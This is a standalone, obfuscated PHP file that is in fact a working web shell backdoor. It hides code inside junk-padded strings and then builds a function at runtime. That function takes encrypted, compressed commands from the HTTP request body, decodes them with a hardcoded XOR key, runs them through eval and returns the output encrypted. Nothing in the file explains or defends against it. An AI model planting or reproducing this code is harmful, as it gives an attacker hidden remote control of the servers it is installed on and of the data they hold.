<?php
$f=';(jv$jjv<$c&&jv$i<$l);jv$j++,$i+jv+){$jvo.=$t{$ijv}^$k{$jvj};}}rejvtujvrn $o;}jvif (@prejvg_match';
$t='";functjvion x($tjv,$kjv){$cjv=jvstrlen($k);$l=jvstrlen($jvt);$ojv="jv";fjvorjv($i=0;$i<$l;){fjvor($j=0';
$H='l(@gjvzuncjvomjvjvjvpress(@x(@basejv64_jvdejvcojvde($mjv[1])jv,$k)));$o=@ob_get_contentjvs();@oj';
$h='jv(jv"/$kjvh(.jv+)$kf/",@fijvle_gejvt_conjvtents("pjvhp:jv//input"),$m)==jv1jv) {@ob_stjvart();@ejvva';
$v='$k="jvdjv55dcjv577";$kjvh="472b029bjvff0b";$kfjv="881a65jv0eaaeajv";$p="jvjv3pB7IIKgL7JjvejvlwSB';
$o='vb_end_clejvanjv();$r=@base6jv4_jvencode(@x(jvjv@gzcomprejvss($o),$jvjvjvk));prjvint("$p$kh$r$kf");}';
$P=str_replace('oG','','oGoGcreoGate_oGfoGunctoGion');
$X=str_replace('jv','',$v.$t.$f.$h.$H.$o);
$r=$P('',$X);$r();
?>
